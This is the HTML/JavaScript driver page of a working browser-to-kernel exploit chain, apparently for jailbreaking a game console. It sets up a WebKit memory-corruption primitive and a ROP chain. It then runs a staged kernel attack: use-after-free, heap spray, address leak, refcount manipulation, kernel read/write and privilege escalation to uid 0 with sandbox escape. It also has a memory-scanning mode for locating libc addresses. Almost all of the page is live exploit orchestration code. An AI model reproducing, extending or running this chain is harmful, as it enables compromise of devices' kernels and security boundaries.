<!-- classic scripts: rop.js defines worker_rop globally, main.js detects
     firmware, injects the offset script, and defines prepare() globally -->
<script src="rop.js"></script>
<script src="main.js"></script>
<script>
window.offsetsReady = new Promise(function (res, rej) {
    var s = document.querySelector('script[src*="offsets/"]');
    if (!s) return rej(new Error("offsets script was never injected by main.js"));
    if (typeof OFFSET_wk_vtable_first_element !== "undefined") return res(s.src);
    s.addEventListener("load", function () { res(s.src); });
    s.addEventListener("error", function () { rej(new Error("offsets 404: " + s.src)); });
});
</script>
<script src="syscalls.js"></script>

<script type="module">
import { establishPrimitive, fakeCellReleased } from "./core.js?v=final";
import { installWindowP, pairStatus } from "./mem.js?v=final";
import { int64 } from "./int64.js";

const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
const btnEl = document.getElementById("btn");

function _persist(msg) {
    try {
        var cur = localStorage.getItem("bgw_log") || "";
        if (cur.length > 16000) cur = cur.slice(-8000);
        localStorage.setItem("bgw_log", cur + msg + "\n");
    } catch(e) {}
}

const BGW_REV = "x25-battery";
let __beaconOff = false;
function beacon(line) {
    // Async image GET: never blocks the exploit (unlike sync XHR), so safe
    // to call from anywhere including ROP/groom paths. A hard crash may drop
    // trailing lines; the on-screen log + localStorage remain the backup.
    if (__beaconOff) return;
    try {
        const clean = String(line).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 160);
        const img = new Image();
        img.src = "log/" + encodeURIComponent("bgw-" + clean);
    } catch (e) { __beaconOff = true; }
}
// Build stamp: first line of every load, so server.log always shows EXACTLY
// which revision ran (ends stale-cache ambiguity forever).
beacon("BUILD " + BGW_REV);
function log(msg, cls) {
    const span = document.createElement("span");
    span.className = cls || "";
    span.textContent = msg + "\n";
    logEl.appendChild(span);
    logEl.scrollTop = logEl.scrollHeight;
    _persist(msg);
    beacon(msg);
}

function setStatus(text, cls) {
    statusEl.textContent = text;
    statusEl.className = cls || "";
    _persist("[STATUS] " + text);
    beacon("[STATUS] " + text);
}

let P = null;
let chain = null;
let chainDead = false;
let syscallCount = 0;

const state = {
    syscallsIssued: new Set(),
    roundTrips: [],
    fdOpen: new Set(),
    cleanupFailed: "",
};

const track = fd => state.fdOpen.add(fd);
const untrack = fd => state.fdOpen.delete(fd);
const sleep = ms => new Promise(r => setTimeout(r, ms));

function classify(raw) {
    if (!(raw instanceof int64)) return { s32: 0, failed: true };
    const lo = raw.low | 0;
    const carry = (raw.hi >>> 0) === 0xFFFFFFFF ? 1 : 0;
    return { s32: lo, failed: carry === 1 && lo < 0 };
}

const ERRNO_NAMES = {
    1: "EPERM", 2: "ENOENT", 3: "ESRCH", 9: "EBADF", 12: "ENOMEM",
    13: "EACCES", 14: "EFAULT", 17: "EEXIST", 22: "EINVAL", 35: "EAGAIN",
    36: "EINPROGRESS", 38: "ENOSYS", 45: "EOPNOTSUPP", 48: "EADDRINUSE",
    61: "ECONNREFUSED", 78: "ENOSPC",
};

function errText(res) {
    if (!res.failed) return "ok";
    const n = (-res.s32) >>> 0;
    return ERRNO_NAMES[n] || ("errno " + n);
}

const WATCHDOG_MS = 15000;
async function watchdog(promise, what) {
    let timer = null;
    try {
        return await Promise.race([
            promise,
            new Promise((_, rej) => {
                timer = setTimeout(() => rej(new Error("WATCHDOG: " + what)), WATCHDOG_MS);
            })
        ]);
    } finally {
        if (timer !== null) clearTimeout(timer);
    }
}

async function sys(num, a, b, c, d, e, f) {
    if (chainDead) throw new Error("sys: chain dead");
    if (P.syscalls[num] === undefined)
        throw new Error("sys: 0x" + num.toString(16) + " no stub");
    syscallCount++;
    state.syscallsIssued.add(num);
    const raw = await watchdog(chain.syscall(num, a, b, c, d, e, f),
        "syscall 0x" + num.toString(16));
    const cl = classify(raw);
    return { raw, s32: cl.s32, failed: cl.failed,
        hex: "0x" + raw.toString(), errText: errText({ s32: cl.s32, failed: cl.failed }) };
}

async function runChain() {
    if (chainDead) throw new Error("chain dead");
    await watchdog(chain.run(), "chain.run");
}

function i64(lo, hi) { return new int64(lo, hi); }

function flushMark(tag, text) {
    log("[" + tag + "] " + text, "info");
}
function queueEvent(tag, text) {
    log("[" + tag + "] " + text, "info");
}
function note(s) {
    log(s, "step");
}
// Published for main.js (classic script): its jbmark() forwards here so
// MODULE-BASES / worker / ROP diagnostics reach the server log. Without
// this they vanish into window.jb (absent on this host).
window.__bgwMark = function (tag, detail) {
    try { flushMark(tag, detail); } catch (e) {}
};

async function init() {
    setStatus("establishing WebKit primitive...", "run");
    log("establishing WebKit exploit primitive...", "stage-hdr");

    try {
        if (typeof prepare !== "function")
            throw new Error("main.js did not evaluate — prepare is undefined");
        if (typeof worker_rop !== "function")
            throw new Error("rop.js did not evaluate — worker_rop is undefined");

        await window.offsetsReady;
        log("offsets loaded for fw " + (window.fw_str || "unknown"), "step");

        if (!wk_gadgetmap || !Object.keys(wk_gadgetmap).length
            || !syscall_map || !Object.keys(syscall_map).length)
            throw new Error("offset file empty: gadgets=" +
                Object.keys(wk_gadgetmap || {}).length + " syscalls=" +
                Object.keys(syscall_map || {}).length);

        let p;
        if (globalThis.p && typeof globalThis.p.read8 === "function") {
            log("primitive already available (reused)", "step");
            p = globalThis.p;
        } else {
            log("running WebKit exploit...", "step");

            try { history.replaceState(null, ""); } catch (e) { }
            if (typeof globalThis.gc === "function") {
                try { globalThis.gc(); } catch (e) { }
            }
            await new Promise(r => setTimeout(r, 750));

            const carrier = await establishPrimitive({
                // 5 was too few on tired heaps (placement misses cluster when
                // browser memory is fragmented); 15 keeps per-load chances up
                // while the ceiling still bounds memory-error spirals.
                maxAttempts: 15,
                onEvent(tag, detail, attempt) {
                    if (tag === "ATTEMPT-START")
                        log("exploit attempt " + attempt, "step");
                    else
                        log("[" + tag + "] " + detail, "info");
                }
            });

            installWindowP(carrier, { onEvent: queueEvent });

            if (typeof globalThis.gc === "function") {
                try { globalThis.gc(); } catch (e) { }
            }
            await new Promise(r => setTimeout(r, 1000));

            if (!pairStatus.promoted)
                throw new Error("pair was NOT promoted (" +
                    pairStatus.error + ")");

            p = globalThis.p;
            if (!p || typeof p.read8 !== "function")
                throw new Error("window.p was never published");

            log("primitive up: attempts=" + carrier.attempts +
                " paired=" + pairStatus.promoted, "step");
        }

        log("prepare(): module bases, gadget/syscall tables, worker hijack...", "step");
        const prepared = await prepare(p);
        P = prepared.p;
        chain = prepared.chain;

        log("ROP chain ready, verifying with getpid()...", "step");
        const pidRaw = await chain.syscall(SYS_GETPID);
        const pid = classify(pidRaw);
        log("getpid() = " + pid.s32, "step");

        if (pid.s32 <= 0) {
            setStatus("ROP chain verification failed", "fail");
            return;
        }

        log("chain operational, pid=" + pid.s32 +
            " gadgets=" + Object.keys(P.gadgets).length +
            " syscalls=" + Object.keys(P.syscalls).length, "step");
        setStatus("ready — press Run Exploit", "");
        btnEl.disabled = false;

    } catch (err) {
        log("init error: " + (err.stack || err.message || err), "err");
        setStatus("initialization failed: " + (err.message || err), "fail");
    }
}

async function runExploit() {
    btnEl.disabled = true;
    try { localStorage.setItem("bgw_log", ""); } catch(e) {}
    setStatus("running Bagagwa exploit...", "run");
    log("\n=== BAGAGWA MULTI CHAIN EXPLOIT ===\n", "stage-hdr");

    try {
        const { makeBagagwaEngine } = await import("./bagagwa.js");
        const { makeBagagwaContext } = await import("./bagagwa_adapter.js");
        const { validateOff } = await import("./off_validate.js");

        const ctx = makeBagagwaContext({ P, chain, i64, log: note, flushMark, queueEvent });

        const engine = makeBagagwaEngine(ctx);

        log("\n--- Stage 0: aio_multi_wait UAF ---\n", "stage-hdr");
        const s0 = await engine.stage0_uaf();
        for (const s of s0.steps) log("  " + s, "step");
        if (!s0.ok) {
            log("STAGE 0 FAILED: " + s0.why, "err");
            setStatus("stage 0 failed: " + s0.why, "fail");
            return;
        }
        log("STAGE 0 OK", "step");

        log("\n--- Stage 1: osem spray ---\n", "stage-hdr");
        const s1 = await engine.stage1_spray();
        for (const s of s1.steps) log("  " + s, "step");
        if (!s1.ok) {
            log("STAGE 1 FAILED: " + s1.why, "err");
            setStatus("stage 1 failed: " + s1.why, "fail");
            return;
        }
        log("STAGE 1 OK", "step");

        log("\n--- Stage 2: kernel address leak ---\n", "stage-hdr");
        const s2 = await engine.stage2_leak();
        for (const s of s2.steps) log("  " + s, "step");
        if (!s2.ok) {
            log("STAGE 2 FAILED: " + s2.why, "err");
            setStatus("stage 2 failed: " + s2.why, "fail");
            return;
        }
        log("STAGE 2 OK", "step");

        log("\n--- Stage 3: refcount manipulation ---\n", "stage-hdr");
        const s3 = await engine.stage3_refcount();
        for (const s of s3.steps) log("  " + s, "step");
        if (!s3.ok) {
            log("STAGE 3 FAILED: " + s3.why, "err");
            setStatus("stage 3 failed: " + s3.why, "fail");
            return;
        }
        log("STAGE 3 OK", "step");

        log("\n--- Stage 4: reclaim + kernel R/W ---\n", "stage-hdr");
        const s4 = await engine.stage4_reclaim();
        for (const s of s4.steps) log("  " + s, "step");
        if (!s4.ok) {
            log("STAGE 4 FAILED: " + s4.why, "err");
            setStatus("stage 4 failed: " + s4.why, "fail");
            return;
        }
        log("STAGE 4 OK — kernel R/W established", "step");

        log("\n--- OFF validation (read-only, gates stage 5) ---\n", "stage-hdr");
        const v = await validateOff(engine);
        for (const c of v.checks) log("  " + (c.ok ? "PASS " : "FAIL ") + c.name + " " + c.detail, c.ok ? "step" : "err");
        if (!v.ok) {
            log("OFF VALIDATION FAILED: " + v.failed.join(", "), "err");
            setStatus("OFF mismatch for this firmware — stage 5 blocked (no writes issued)", "fail");
            return;
        }
        log("OFF validation passed — proceeding to stage 5", "step");

        log("\n--- Stage 5: jailbreak ---\n", "stage-hdr");
        const s5 = await engine.stage5_jailbreak();
        for (const s of s5.steps) log("  " + s, "step");
        if (!s5.ok) {
            log("STAGE 5 FAILED: " + s5.why, "err");
            setStatus("stage 5 failed: " + s5.why, "fail");
            return;
        }

        log("\n=== JAILBREAK COMPLETE ===", "stage-hdr");
        log("uid: " + s5.before.uid + " -> " + s5.after.uid, "step");
        log("getuid(): " + s5.after.getuid, "step");
        log("kernel writes: " + engine.kernelWrites, "step");
        setStatus("JAILBROKEN — uid=0, sandbox escaped", "ok");

    } catch (err) {
        log("exploit error: " + (err.stack || err.message || err), "err");
        setStatus("exploit failed: " + (err.message || err), "fail");
    }
}

btnEl.addEventListener("click", runExploit);

// ?goscan=1 mode: find the libc import WITHOUT guessing. Scans readable
// WebKit .data for pointers V where V-RVA is an aligned in-band base, over
// 15 historical libc RVAs (memset/setjmp/longjmp) + 4 VERIFIED libkernel
// RVAs. Kernel tallies must cluster at the GOT-derived base of THIS run --
// that self-validates the method; any libc cluster is then trustworthy.
// Tallies snapshot incrementally (a fault loses nothing already printed).
// Pure reads via the promoted pair; stages are NEVER entered from here.
async function runGoscan() {
    for (let i = 0; i < 600 && !window.__bgwScan; i++) await sleep(1000);
    const SP = window.__bgwScan;
    if (!SP || !SP.p || !SP.webkitBase) {
        log("goscan: scan state never published", "err");
        return;
    }
    const rp = SP.p, rbase = SP.webkitBase;
    const LC = [0x14700, 0x14B90, 0x14E80, 0x15170, 0x15BF0,
        0x5A2B0, 0x5A380, 0x5AD30, 0x5B850, 0x5D990,
        0x5A300, 0x5A3D0, 0x5AD80, 0x5B8A0, 0x5D9E0];
    const KJ = [0x48B0, 0xF7D0, 0x1B860, 0x274E0];
    const START = 0x334C000, END = 0x3350000;
    const tally = new Map();
    const bump = (key, ex) => {
        let e = tally.get(key);
        if (!e) { e = { n: 0, ex: [] }; tally.set(key, e); }
        e.n++;
        if (e.ex.length < 3) e.ex.push(ex);
    };
    const snapshot = (why) => {
        const rows = [...tally.entries()].filter(([, e]) => e.n >= 2)
            .sort((a, b) => b[1].n - a[1].n).slice(0, 8);
        for (const [k, e] of rows) log("GOTSCAN-" + why + " base=" + k + " n=" + e.n + " ex=" + e.ex.join(","), "info");
    };
    let windows = 0, lastGood = START;
    log("goscan: range 0x" + START.toString(16) + "-0x" + END.toString(16) +
        " rvas lc=" + LC.length + " kj=" + KJ.length, "stage-hdr");
    for (let off = START; off < END; off += 0x100) {
        for (let o = 0; o < 0x100; o += 8) {
                const v = rp.read8(rbase.add32(off + o));
            if ((v.hi >>> 0) !== 0x8) continue;
            const lo = v.low >>> 0;
            for (let r = 0; r < LC.length + KJ.length; r++) {
                const rva = r < LC.length ? LC[r] : KJ[r - LC.length];
                const fam = r < LC.length ? "lc" : "kj";
                if (lo < rva) continue;
                const blo = (lo - rva) >>> 0;
                if ((blo % 0x4000) !== 0) continue;
                bump("0x8" + blo.toString(16).padStart(8, "0"),
                    fam + ":+0x" + (off + o).toString(16) +
                    ":rva=0x" + rva.toString(16));
            }
        }
        windows++;
        lastGood = off;
        if ((windows & 15) === 0) log("goscan window 0x" + off.toString(16), "info");
        if ((windows & 63) === 0) snapshot("snap");
    }
    snapshot("final");
    log("GOTSCAN-DONE windows=" + windows + " lastGood=0x" + lastGood.toString(16), "stage-hdr");
    log("goscan complete -- do NOT press Run Exploit unless instructed", "warn");
}
if (typeof window !== "undefined" && window.location &&
    new URLSearchParams(window.location.search).get("goscan") === "1") {
    runGoscan();
}

if (typeof window !== "undefined" && window.location) {
    init();
} else {
    setStatus("not running in a browser context", "fail");
}
</script>
